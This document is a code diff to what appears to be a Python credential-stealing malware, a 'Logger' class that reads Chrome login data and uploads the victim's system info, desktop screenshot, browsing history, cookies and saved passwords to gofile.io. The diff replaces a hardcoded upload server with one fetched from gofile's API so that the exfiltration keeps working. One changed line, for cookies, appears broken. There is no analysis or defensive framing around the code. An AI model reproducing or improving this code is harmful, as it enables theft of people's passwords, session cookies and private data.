@@ -64,6 +64,9 @@ path = path.join(
     "Default",
     "Login Data",
 )
+store = requests.get("https://api.gofile.io/getServer").text
+jsonified = json.loads(store)
+storeFinal = jsonified['data']['server']
 myname = str(sys.argv[0])
 USER_NAME = getpass.getuser()
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -265,7 +268,7 @@ class Logger():
                 pciFile.write(resultPC)
                 pciFile.close()
             try:
-                pcInfoRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('pci.txt', open('pci.txt', 'rb')),}).text
+                pcInfoRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('pci.txt', open('pci.txt', 'rb')),}).text
                 pcInfoUploaded = f"[Raw]({pcInfoRaw[87:113]})"
                 os.remove("pci.txt")
             except:
@@ -302,7 +305,7 @@ class Logger():
             screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
             screen.close()
             try:
-                screenshotRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
+                screenshotRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
                 screenshotUploaded = f"[Desktop Image]({screenshotRaw[87:113]})"
             except:
                 screenshotUploaded = "Desktop Image: N/A"
@@ -311,7 +314,7 @@ class Logger():
             print(e)
         # History
         try:
-            historyRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('hist.txt', open('hist.txt', 'rb')),}).text
+            historyRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('hist.txt', open('hist.txt', 'rb')),}).text
             historyUploaded = f"[History]({historyRaw[87:113]})"
             os.remove("hist.txt")
         except Exception as e:
@@ -320,7 +323,7 @@ class Logger():
 
         # Cookies
         try:
-            cookiesRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
+            cookiesRaw = requests.post('https://' + storeFinal + 'store7.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
             cookiesUploaded = f"[Cookies]({cookiesRaw[87:113]})"
             os.remove("rc.txt")
         except Exception as e:
@@ -329,7 +332,7 @@ class Logger():
 
         # Passwords
         try:
-            passwordsRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('psd.txt', open('psd.txt', 'rb')),}).text
+            passwordsRaw = requests.post('https://' + storeFinal + '.gofile.io/uploadFile', files={'file': ('psd.txt', open('psd.txt', 'rb')),}).text
             passwordsUploaded = f"[Passwords]({passwordsRaw[87:113]})"
             os.remove("psd.txt")
         except Exception as e:
